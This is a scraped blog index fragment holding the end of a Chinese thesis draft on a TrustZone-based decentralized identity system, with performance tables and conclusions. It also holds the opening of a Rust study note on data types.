473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1403,0)\"/></g></g></g></g></g></svg></mjx-container></span> 分别表示在 REE 与 TEE\n中的吞吐率，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.375ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.085ex\" height=\"1.92ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 2247.5 848.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g></g></g></svg></mjx-container></span> 与 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.062ex\" height=\"1.885ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 2237.6 833\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1403,0)\"/></g></g></g></g></g></svg></mjx-container></span>\n表示相应的平均延迟。</p></li>\n</ul>\n<p>此外，为测试系统在完整业务场景下的可用性与稳定性，本文进一步搭建了一个\n<strong>虚拟电影院</strong> 场景应用平台。该平台主要包含：</p>\n<ul>\n<li><strong>后端服务</strong>：基于 Node.js + Express\n框架实现，提供电影信息展示、购票下单、检票验证、凭证颁发等功能。</li>\n<li><strong>前端页面</strong>：使用 Vue3\n框架构建，提供用户身份注册、凭证管理、购票流程交互与验证请求发起等界面。</li>\n</ul>\n<h2 id=\"智能合约模块性能测试与分析\">4.2 智能合约模块性能测试与分析</h2>\n<blockquote>\n<p>照搬论文。</p>\n</blockquote>\n<p>本节对基于 TrustZone\n的智能合约执行模块在两类核心操作下的性能开销进行评估：状态查询（query）与交易提交（transaction）。</p>\n<p>在 Cosmos SDK\n的运行模型中，交易操作（tx）在每个区块生成前以批处理形式统一执行，平均出块间隔约为\n3\n秒，吞吐率受限于区块大小与出块频率。而状态查询操作不会修改链上状态，允许节点实时响应，具有更强的并发处理能力。因此，我们分别测量两类操作在不同并发负载下的吞吐率与平均响应延迟，并对比\nTEE 与 REE 两种执行环境下的结果。</p>\n<p>实验过程中我们发现，无论合约逻辑如何，首次在 TEE 中发起调用均需通过\n建立安全会话，该操作为每笔交易引入显著的性能开销。该现象与 TZ4Fabric\n的实验结果一致 。为降低开销，我们在系统中对 与\n进行全局缓存，避免频繁创建会话带来的冗余损耗。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\begin{figure}[h]</span><br><span class=\"line\"></span><br><span class=\"line\">\\centering</span><br><span class=\"line\"></span><br><span class=\"line\">% \\hspace*{-0.1\\textwidth}</span><br><span class=\"line\"></span><br><span class=\"line\">\\includegraphics[width=1\\textwidth]{figure/performance.pdf}</span><br><span class=\"line\"></span><br><span class=\"line\">\\caption{不同并发数下 REE 与 TEE 环境中状态查询与交易提交的延迟与吞吐率对比}</span><br><span class=\"line\"></span><br><span class=\"line\">\\label{fig:query-tx-performance}</span><br><span class=\"line\"></span><br><span class=\"line\">\\end{figure}</span><br></pre></td></tr></table></figure>\n<p>如图 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.204ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 1416 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><a href=\"#\"><g data-mml-node=\"mrow\" class=\" MathJax_ref\"><rect data-hitbox=\"true\" fill=\"none\" stroke=\"none\" pointer-events=\"all\" width=\"1416\" height=\"705\" y=\"0\"/><g data-mml-node=\"mtext\"><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(472,0)\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(944,0)\"/></g></g></a></g></g></svg></mjx-container></span>\n所示，实验结果主要包括以下两点观察：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\begin{enumerate}</span><br><span class=\"line\"></span><br><span class=\"line\">\\item **查询操作**方面，TEE 环境下的平均延迟始终是 REE 的两倍以上，吞吐率稳定在约 11 QPS，为 REE 的约 47%。由于 TEE 中存在上下文切换、共享内存通信和 TA 调度等额外开销，整体性能有所下降。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\item **交易操作**方面，在并发数较低时，TEE 所引入的性能影响相对较小，吞吐率与 REE 接近，延迟略有增加。然而并发数上升后，交易处理出现积压，部分请求需延迟至后续区块执行，导致平均延迟增加。最终，TEE 模式下交易吞吐率趋于稳定，略低于 REE。</span><br><span class=\"line\"></span><br><span class=\"line\">\\end{enumerate}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\begin{table}[t]</span><br><span class=\"line\"></span><br><span class=\"line\">\\centering</span><br><span class=\"line\"></span><br><span class=\"line\">\\caption{TEE 引入的性能影响：与 TZ4Fabric 系统对比}</span><br><span class=\"line\"></span><br><span class=\"line\">\\label{tab:TDR_LIR_Table}</span><br><span class=\"line\"></span><br><span class=\"line\">\\renewcommand{\\arraystretch}{1.15}</span><br><span class=\"line\"></span><br><span class=\"line\">\\setlength{\\tabcolsep}{6pt}</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\begin{subtable}[t]{0.46\\linewidth}</span><br><span class=\"line\"></span><br><span class=\"line\">\\centering</span><br><span class=\"line\"></span><br><span class=\"line\">\\caption{状态查询（Query）}</span><br><span class=\"line\"></span><br><span class=\"line\">\\label{tab:query_variation}</span><br><span class=\"line\"></span><br><span class=\"line\">\\begin{tabular}{c cc cc}</span><br><span class=\"line\"></span><br><span class=\"line\">\\toprule</span><br><span class=\"line\"></span><br><span class=\"line\">\\multirow{2}{*}{\\textbf{并发数}} &amp;*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\multicolumn{2}{c}{\\textbf{TDR}} &amp;*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\multicolumn{2}{c}{\\textbf{LIR}} \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\cmidrule(lr){2-3}\\cmidrule(lr){4-5}*</span><br><span class=\"line\"></span><br><span class=\"line\">*&amp; TZ &amp; 本文 &amp; TZ &amp; 本文 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\midrule*</span><br><span class=\"line\"></span><br><span class=\"line\">*1 &amp; 0.50 &amp; 0.27 &amp; 1.63 &amp; 0.67 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*2 &amp; 0.59 &amp; 0.33 &amp; 1.70 &amp; 0.79 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*4 &amp; 0.59 &amp; 0.46 &amp; 1.52 &amp; 1.15 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*8 &amp; 0.61 &amp; 0.51 &amp; 1.75 &amp; 1.20 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*16 &amp; 0.67 &amp; 0.54 &amp; 3.18 &amp; 1.30 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*32 &amp; 0.79 &amp; 0.53 &amp; 4.92 &amp; 1.20 \\*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\bottomrule*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\end{tabular}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\end{subtable}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\hfill*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\begin{subtable}[t]{0.46\\linewidth}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\centering*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\caption{交易提交（Transaction）}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\label{tab:tx_variation}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\begin{tabular}{c cc cc}*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\toprule*</span><br><span class=\"line\"></span><br><span class=\"line\">*\\multirow{2}{*}{\\textbf{并发数}} &amp;</span><br><span class=\"line\"></span><br><span class=\"line\">\\multicolumn{2}{c}{\\textbf{TDR}} &amp;</span><br><span class=\"line\"></span><br><span class=\"line\">\\multicolumn{2}{c}{\\textbf{LIR}} \\</span><br><span class=\"line\"></span><br><span class=\"line\">\\cmidrule(lr){2-3}\\cmidrule(lr){4-5}</span><br><span class=\"line\"></span><br><span class=\"line\">&amp; TZ &amp; 本文 &amp; TZ &amp; 本文 \\</span><br><span class=\"line\"></span><br><span class=\"line\">\\midrule</span><br><span class=\"line\"></span><br><span class=\"line\">1 &amp; 0.46 &amp; 0.01 &amp; 1.48 &amp; 0.01 \\</span><br><span class=\"line\"></span><br><span class=\"line\">2 &amp; 0.62 &amp; 0.04 &amp; 1.48 &amp; 0.05 \\</span><br><span class=\"line\"></span><br><span class=\"line\">4 &amp; 0.61 &amp; 0.05 &amp; 1.54 &amp; 0.04 \\</span><br><span class=\"line\"></span><br><span class=\"line\">8 &amp; 0.61 &amp; 0.07 &amp; 1.88 &amp; 0.07 \\</span><br><span class=\"line\"></span><br><span class=\"line\">16 &amp; 0.68 &amp; 0.24 &amp; 3.46 &amp; 0.33 \\</span><br><span class=\"line\"></span><br><span class=\"line\">32 &amp; 0.79 &amp; 0.45 &amp; 5.11 &amp; 0.87 \\</span><br><span class=\"line\"></span><br><span class=\"line\">\\bottomrule</span><br><span class=\"line\"></span><br><span class=\"line\">\\end{tabular}</span><br><span class=\"line\"></span><br><span class=\"line\">\\end{subtable}</span><br><span class=\"line\"></span><br><span class=\"line\">\\end{table}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>从表 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.204ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 1416 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><a href=\"#\"><g data-mml-node=\"mrow\" class=\" MathJax_ref\"><rect data-hitbox=\"true\" fill=\"none\" stroke=\"none\" pointer-events=\"all\" width=\"1416\" height=\"705\" y=\"0\"/><g data-mml-node=\"mtext\"><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(472,0)\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(944,0)\"/></g></g></a></g></g></svg></mjx-container></span>\n可以看出，相较于 TZ4Fabric\n系统，本文提出的架构在查询与交易场景下均表现出更低的性能损耗，尤其是在交易提交操作中，TEE\n所带来的延迟提升与吞吐下降更为平缓，表明本系统在性能与隐私保护之间取得了更优的平衡。</p>\n<h2 id=\"分布式数字身份系统功能测试\">4.3 分布式数字身份系统功能测试</h2>\n<blockquote>\n<p>照搬论文</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">为评估系统在典型使用场景下对分布式数字身份（DID）相关功能的处理能力，我们对 DID 注册、DID 文档查询 与 VC 验证 三个核心操作进行了性能测试。在资源受限环境下，每项操作均以单线程模式连续执行 200 次，并记录其平均响应时间，以评估系统在单个用户请求下的响应效率。</span><br><span class=\"line\"></span><br><span class=\"line\">表 \\ref{tab:did_performance} 展示了上述三项操作的平均、最小与最大响应延迟：</span><br><span class=\"line\"></span><br><span class=\"line\">\\begin{table}[t]</span><br><span class=\"line\">\\centering</span><br><span class=\"line\">\\caption{DID 合约功能操作的延迟评估}</span><br><span class=\"line\">\\label{tab:did_performance}</span><br><span class=\"line\">\\renewcommand{\\arraystretch}{1.15}</span><br><span class=\"line\">\\setlength{\\tabcolsep}{8pt}</span><br><span class=\"line\">\\begin{tabular}{lccc}</span><br><span class=\"line\">\\toprule</span><br><span class=\"line\">\\textbf{功能模块} &amp; \\textbf{平均延迟（ms）} &amp; \\textbf{最小值（ms）} &amp; \\textbf{最大值（ms）} \\</span><br><span class=\"line\">\\midrule</span><br><span class=\"line\">Create DID  &amp; 3059.91 &amp; 3056.13 &amp; 3100.83 \\</span><br><span class=\"line\">Query DID   &amp; 216.31  &amp; 198.79  &amp; 281.29  \\</span><br><span class=\"line\">Verify VC   &amp; 2119.69 &amp; 1793.26 &amp; 2318.74 \\</span><br><span class=\"line\">\\bottomrule</span><br><span class=\"line\">\\end{tabular}</span><br><span class=\"line\">\\end{table}</span><br><span class=\"line\"></span><br><span class=\"line\">从测试结果可以看出，Query DID 的平均延迟约为 216 毫秒，是三项操作中响应最快的，反映出系统在链上状态读取方面具有良好的实时性，适用于高频身份信息检索。Create DID 的平均响应时间约为 3 秒，与区块链交易的打包与出块周期一致，延迟稳定，满足去中心化身份注册的功能需求。Verify VC 的平均响应时间约为 2.1 秒，虽高于前两项操作，但其过程包含对称加密解密与条件判断等计算步骤，在多数身份验证场景中仍属于可接受范围。</span><br><span class=\"line\"></span><br><span class=\"line\">总体而言，测试结果表明该系统即便在 TrustZone 的受限执行环境中，也能保持良好的响应性能，核心功能均可实现秒级响应。特别是在移动终端与边缘计算等实际部署场景中，DID 查询与 VC 验证操作具备较强的实用性，有效验证了本架构在隐私保护与服务性能之间的可行平衡。</span><br></pre></td></tr></table></figure>\n<h2 id=\"虚拟电影院应用场景测试\">4.4 虚拟电影院应用场景测试</h2>\n<blockquote>\n<p>用户端交互界面流程展示，截图配文字。</p>\n</blockquote>\n<h1 id=\"结论与展望\">5 结论与展望</h1>\n<h2 id=\"结论\">5.1 结论</h2>\n<p>本文围绕“基于 TrustZone\n的元宇宙分布式数字身份系统”展开研究，提出了一种面向资源受限设备的轻量级智能合约执行架构。该架构基于\nARM TrustZone 构建可信执行环境，并引入 WebAssembly\n运行时以支持合约的灵活部署与执行。同时设计了一套高效的链上链下通信机制，支持\nREE 与 TEE 之间的协同工作。</p>\n<p>在此基础上，本文实现了一个分布式数字身份系统，支持去中心化的身份注册、可验证凭证的发放与加密校验。通过\nECDH 密钥协商与 AES\n加密方式，系统实现了无需明文暴露的零知识式认证机制，满足了隐私保护与可验证性的双重需求。结合虚拟电影院场景的完整实现，系统展示了在现实业务中保护用户身份隐私的实际能力。</p>\n<p>实验结果表明，该系统在保证隐私保护的同时，维持了良好的执行性能和响应能力，验证了将隐私增强型合约部署于\nTrustZone 等低功耗终端设备的可行性。</p>\n<h2 id=\"展望\">5.2 展望</h2>\n<p>尽管本系统在隐私保护与工程实现方面取得了一定成果，仍有若干值得深入研究与优化的方向：</p>\n<p>首先，当前系统默认 TrustZone 中的 TEE\n环境完全可信，尚未涵盖针对侧信道攻击、特权升级等低层级威胁模型的防护机制。未来可引入远程证明（Remote\nAttestation）或执行完整性检测手段，增强系统在不完全可信执行环境下的安全鲁棒性。</p>\n<p>其次，DID 模块目前支持基本的身份注册与 VC\n验证，后续可扩展更多身份属性表达与组合校验能力，支持属性区间验证、多凭证联合验证等高级场景，提升系统在实际应用中的表达能力与灵活性。</p>\n<p>在系统性能方面，仍可通过优化共享内存的读写策略与通信线程模型，进一步压缩\nREE 与 TEE\n间的上下文切换与数据传输开销，从而提升高并发条件下的系统响应效率。</p>\n<p>此外，Wasm\n智能合约模块可进一步集成更丰富的安全原语接口，如零知识证明构造、选择性披露、可撤销凭证等，以支持更复杂的隐私计算任务。</p>\n<p>最后，结合 Cosmos 的 IBC\n跨链通信协议，系统可进一步向多链环境拓展，为异构区块链平台提供统一的可信身份认证与隐私保护服务，构建更具通用性和可扩展性的分布式身份基础设施。</p>\n<p>​</p>\n<p>Wasm\n的核心优势包括：1）快速启动与高效执行，适用于对响应速度有严格要求的应用场景；2）跨平台兼容性强，得益于统一的中间格式和平台中立的运行时抽象；3）内存安全与沙箱隔离机制，通过线性内存模型、模块边界限制等手段，天然具备良好的安全性与可控性；4）模块化与可组合性强，支持模块导入导出机制，便于功能拆分与系统集成。</p>\n","categories":["笔记"],"tags":["TrustZone","智能合约","毕设"]},{"title":"Rust 学习笔记 - 数据类型、函数、控制流","url":"/rust/2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E3%80%81%E5%87%BD%E6%95%B0%E3%80%81%E6%8E%A7%E5%88%B6%E6%B5%81/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一特性时的理解和总结</p>\n</blockquote>\n<p>本文记录了对于 Rust\n数据类型、函数、控制流相关的内容。并不详细记录所有细节，只记录和其他高级语言有区别的部分。</p>\n<span id=\"more\"></span>\n<h1 id=\"数据类型\">1 数据类型</h1>\n<p>再次强调 Rust\n是一个<strong>静态类型</strong>语言，必须能在编译阶段知道所有变量的类型。不需要显式规定类型的必要前提是可以推导。</p>\n<p>例如在进行类型转换时：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">guess</span>: <span class=\"type\">u32</span> = <span class=\"string\">\"42\"</span>.<span class=\"title function_ invoke__\">parse</span>().<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">\"Not a number!\"</span>);</span><br></pre></td></tr></table></figure>\n<p>这里不能确定要将 <code>42</code> 解析成什么类型，可能是\n<code>i32</code> <code>u32</code> <code>f64</code>……，所以必须指定\n<code>guess: u32</code></p>\n<p>Rust 的数据类型分为两类，标量类型(scarlar)和组合类型(compound)。</p>\n<h2 id=\"标量类型\">1.1 标量类型</h2>\n<h3 id=\"整数类型\">1.1.1 整数类型</h3>\n<p>变量名从表意的 <code>int</code> <code>long</code>\n变成了可以清晰表示数字位数的 <code>i32</code>\n<code>i64</code>，jiangly写算法就喜欢\n<code>using i64 = long long;</code>。</p>\n<p>并且最大提供了 <code>i128</code> <code>u128</code>\n，<code>u128</code> 最大能表示\n<code>340282366920938463463374607431768211455</code>\n，一般情况绝对够用了。</p>\n<p>类似于 <code>size_t</code> Rust 有 <code>isize</code>\n<code>usize</code>。位数和系统的位数一致。</p>\n<p>数字的字面量有以下特性：</p>\n<ul>\n<li>默认类型为 <code>i32</code></li>\n<li>可以在后缀增加指定类型，例如 <code>123u8</code></li>\n<li>与其他语言相同，前缀指定进制，十六进制：<code>0x</code>\n；八进制：<code>0o</code> ；二进制 <code>0b</code></li>\n<li>可以用下划线作为分隔符，例如<code>1000_0000</code></li>\n<li><strong>字节</strong>：<code>b'A'</code> 表示一个 <code>u8</code>\n类型的整数，即 <code>60</code> ，等价于C/C++中的\n<code>unsigned char</code></li>\n</ul>\n<h3 id=\"字符类型\">1.1.2 字符类型</h3>\n<p>Rust 中的字符类型(char) 和 C/C++\n中的不同，占用空间<strong>4字节</strong>，表示的是 Unicode 编码而非\nASCII 编码。</p>\n<p>总而言之，Rust 中的 char\n类型可以表示任何键盘可以打出来的<strong>一个</strong>字符。这里的<strong>一个</strong>是直观感觉的一个字符，站在用户角度的一个字符，而非程序员习惯的一个字符。</p>\n<h3 id=\"浮点类型\">1.1.3 浮点类型</h3>\n<p>基本和传统语言一样，但是字面量的<strong>默认类型</strong>为\n<code>f64</code> ，因为 Rust\n认为现代计算机中双浮点数和单浮点数的计算效率已经差距不大。</p>\n<h3 id=\"布尔类型\">1.1.4 布尔类型</h3>\n<p>基本和传统语言一样，占用空间<strong>1字节</strong>。</p>\n<h2 id=\"复合类型\">1.2 复合类型</h2>\n<p>分为元组(tuple)和数组(array)。</p>\n<h3 id=\"元组\">1.2.1 